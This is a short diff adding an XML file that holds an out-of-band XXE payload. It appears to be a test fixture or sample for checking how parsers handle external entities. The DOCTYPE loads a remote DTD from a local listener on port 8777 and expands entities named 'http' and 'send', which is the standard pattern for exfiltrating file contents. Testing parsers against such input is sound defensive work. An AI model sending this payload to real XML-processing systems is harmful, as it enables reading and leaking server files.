@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [
+        <!ENTITY % dtd PUBLIC "-//OXML/XXE/EN" "http://127.0.0.1:8777/http.dtd">
+        %dtd;%http;
+        ]>
+<root>
+    <a>&send;</a>
+</root>
